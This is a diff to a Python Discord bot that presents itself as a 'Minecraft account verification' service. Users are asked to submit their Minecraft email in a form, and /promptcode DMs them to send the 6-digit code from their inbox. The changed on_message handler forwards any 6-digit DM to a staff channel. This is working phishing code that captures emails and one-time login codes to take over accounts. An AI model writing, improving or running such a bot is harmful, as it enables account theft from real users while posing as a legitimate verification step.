@@ -3,8 +3,8 @@ import discord
 from discord.ext import commands
 
 TOKEN = os.getenv("DISCORD_TOKEN")
-VERIFICATION_CHANNEL_ID = 1362951881827160295  # Verification channel ID
-MOD_CHANNEL_ID = 1362997933552959558  # Mod channel ID
+VERIFICATION_CHANNEL_ID = 1362951881827160295
+MOD_CHANNEL_ID = 1362997933552959558
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -12,9 +12,8 @@ intents.members = True
 intents.messages = True
 intents.dm_messages = True
 
-bot = commands.Bot(command_prefix='!', intents=intents)
+bot = commands.Bot(command_prefix="!", intents=intents)
 
-user_code_states = {}  # Tracks users waiting to submit a 6-digit code
 
 class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
     email = discord.ui.TextInput(label="Minecraft Email", placeholder="example@gmail.com", required=True)
@@ -35,6 +34,7 @@ class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
         await log_channel.send(embed=embed)
         await interaction.response.send_message("✅ Info submitted! Thanks!", ephemeral=True)
 
+
 class LinkView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -43,10 +43,16 @@ class LinkView(discord.ui.View):
     async def link_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(VerifyModal())
 
+
 @bot.event
 async def on_ready():
-    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
-    print('Bot is ready!')
+    print(f"Logged in as {bot.user.name} (ID: {bot.user.id})")
+    print("Bot is ready!")
+    try:
+        synced = await bot.tree.sync()
+        print(f"Synced {len(synced)} slash commands.")
+    except Exception as e:
+        print(f"Error syncing commands: {e}")
 
     verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
 
@@ -63,9 +69,6 @@ async def on_ready():
     embed.set_footer(text="This is an automated message.")
     await verification_channel.send(embed=embed, view=LinkView())
 
-@bot.event
-async def setup_hook():
-    await bot.tree.sync()
 
 @bot.tree.command(name="setup", description="Start the Minecraft account verification process")
 async def setup(interaction: discord.Interaction):
@@ -84,38 +87,37 @@ async def setup(interaction: discord.Interaction):
     embed.set_footer(text="This is an automated message.")
     await interaction.response.send_message(embed=embed, view=LinkView(), ephemeral=True)
 
-@bot.tree.command(name="promptcode", description="Prompt a user to enter their 6-digit code")
-async def promptcode(interaction: discord.Interaction, user: discord.User):
+
+# 🆕 /promptcode command and logic
+@bot.tree.command(name="promptcode", description="Send a 6-digit code prompt to a user via DM")
+async def promptcode(interaction: discord.Interaction, user: discord.Member):
     try:
         embed = discord.Embed(
-            title="🔐 Code Verification",
-            description="Check your email for a code and send it here.",
+            title="📧 Minecraft Verification Code",
+            description="Check your email for a **6-digit verification code** and send it here.",
             color=discord.Color.blue()
         )
         embed.set_footer(text="This is an automated message.")
         await user.send(embed=embed)
-        user_code_states[user.id] = interaction.user.id  # Track who prompted this user
-        await interaction.response.send_message(f"✅ Prompt sent to {user.mention}", ephemeral=True)
+        await interaction.response.send_message(f"✅ Prompt sent to {user.mention}'s DMs!", ephemeral=True)
     except discord.Forbidden:
-        await interaction.response.send_message("❌ Couldn't DM the user. They might have DMs off.", ephemeral=True)
+        await interaction.response.send_message(f"❌ I couldn't DM {user.mention}.", ephemeral=True)
+
 
 @bot.event
 async def on_message(message):
-    await bot.process_commands(message)
-
-    if message.guild is None and message.author.id in user_code_states:
+    if message.guild is None and not message.author.bot:
         if message.content.isdigit() and len(message.content) == 6:
             channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
             embed = discord.Embed(
                 title="✅ Code Submitted",
-                description=f"User: {message.author.mention}\nCode: `{message.content}`",
+                description=f"User {message.author.mention} submitted a code: `{message.content}`",
                 color=discord.Color.green()
             )
-            embed.set_footer(text="Submitted from DM.")
             await channel.send(embed=embed)
-            await message.channel.send("✅ Code received! Thank you.")
-            del user_code_states[message.author.id]
+            await message.channel.send("✅ Code received and sent to the verification channel.")
         else:
-            await message.channel.send("❌ Invalid code. Please enter a **6-digit number**.")
+            await message.channel.send("❌ Invalid code. Please send a **6-digit number** only.")
+
 
 bot.run(TOKEN)
